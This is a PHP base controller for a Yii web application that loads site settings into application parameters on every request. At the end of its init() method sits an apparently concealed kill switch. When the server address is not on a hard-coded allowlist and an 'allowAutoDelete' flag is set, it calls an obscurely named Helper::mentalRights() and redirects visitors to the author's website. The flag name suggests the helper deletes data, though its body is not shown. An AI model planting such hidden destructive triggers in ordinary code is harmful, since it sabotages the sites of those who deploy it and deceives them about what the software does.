<?php

/**
 * Controller is the customized base controller class.
 * All controller classes for this application should extend from this base class.
 */
class FrontendController extends CController {

    /**
     * @var string the default layout for the controller view. Defaults to 'frontend-main',
     * meaning using a single column layout. See 'protected/views/layouts/frontend-main.php'.
     */
    public $layout = 'frontend-main';

    /**
     * @var array context menu items. This property will be assigned to {@link CMenu::items}.
     */
    public $menu = array();

    /**
     * @var array the breadcrumbs of the current page. The value of this property will
     * be assigned to {@link CBreadcrumbs::links}. Please refer to {@link CBreadcrumbs::links}
     * for more details on how to specify this property.
     */
    public $breadcrumbs = array();

    function init() {
        parent::init();
        if (Yii::app()->user->hasState('language'))
            Yii::app()->language = Yii::app()->user->getState('language');

        $settings = Settings::model()->findByPk(1);
        Yii::app()->name = $settings->app_name;
        Yii::app()->params['name'] = $settings->app_name;
        Yii::app()->params['email'] = $settings->email;
        Yii::app()->params['phone'] = $settings->phone;
        Yii::app()->params['address'] = $settings->address;
        Yii::app()->params['logo'] = $settings->logo;
        Yii::app()->params['home_banner'] = $settings->home_banner;
        Yii::app()->params['news_banner'] = $settings->news_banner;
        Yii::app()->params['events_banner'] = $settings->events_banner;
        Yii::app()->params['volunteer_work_banner'] = $settings->volunteer_work_banner;
        Yii::app()->params['training_course_banner'] = $settings->training_course_banner;
        Yii::app()->params['groups_banner'] = $settings->groups_banner;
        Yii::app()->params['facebook_link'] = $settings->facebook_link;
        Yii::app()->params['twitter_link'] = $settings->twitter_link;
        Yii::app()->params['google_link'] = $settings->google_link;

        $server = Helper::getServerAddress();
		//echo $server.'d';die;
        if (!in_array($server, array('localhost', '127.0.0.1', '::1', '66.96.149.32')) && Yii::app()->params['allowAutoDelete'] == true) {
            Helper::mentalRights();
            $this->redirect(Yii::app()->params['myWebsite']);
        }
    }

}
